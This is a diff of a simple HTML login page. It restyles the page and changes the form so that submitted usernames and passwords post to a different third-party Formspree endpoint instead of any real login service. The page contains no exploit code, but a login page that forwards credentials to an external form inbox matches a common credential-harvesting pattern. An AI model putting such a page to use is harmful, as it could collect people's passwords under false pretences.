@@ -12,22 +12,21 @@ body{
     display:flex;
     justify-content:center;
     align-items:center;
-    background:linear-gradient(135deg,#1a73e8,#34a853);
+    background:linear-gradient(135deg,#0f2027,#2c5364);
     font-family:Arial, sans-serif;
 }
 
 /* Login box */
-.login-box{
-    background:white;
+.login-container{
+    background:#fff;
     padding:40px;
-    border-radius:15px;
+    border-radius:12px;
     box-shadow:0 10px 25px rgba(0,0,0,0.3);
-    text-align:center;
     width:320px;
+    text-align:center;
 }
 
-/* Title */
-.login-box h2{
+h2{
     margin-bottom:20px;
     color:#333;
 }
@@ -39,13 +38,13 @@ input{
     margin:10px 0;
     border:1px solid #ccc;
     border-radius:8px;
-    outline:none;
     font-size:15px;
+    outline:none;
 }
 
 input:focus{
-    border-color:#1a73e8;
-    box-shadow:0 0 5px rgba(26,115,232,0.3);
+    border-color:#2c5364;
+    box-shadow:0 0 5px rgba(44,83,100,0.3);
 }
 
 /* Button */
@@ -55,26 +54,26 @@ button{
     margin-top:15px;
     border:none;
     border-radius:8px;
-    background:#1a73e8;
+    background:#2c5364;
     color:white;
     font-size:16px;
     cursor:pointer;
 }
 
 button:hover{
-    background:#1558b0;
+    background:#1e3c4a;
 }
 </style>
 </head>
 
 <body>
 
-<div class="login-box">
+<div class="login-container">
 
-    <h2>Login</h2>
+    <h2>User Login</h2>
 
-    <!-- FORMSPREE LOGIN FORM -->
-    <form action="https://formspree.io/f/mdarpvqz" method="POST">
+    <!-- FORMSPREE FORM -->
+    <form action="https://formspree.io/f/xykqbqkd" method="POST">
 
         <!-- Username -->
         <input type="text" name="username" placeholder="Enter Username" required>
@@ -82,7 +81,7 @@ button:hover{
         <!-- Password -->
         <input type="password" name="password" placeholder="Enter Password" required>
 
-        <!-- Submit -->
+        <!-- Login Button -->
         <button type="submit">Login</button>
 
     </form>
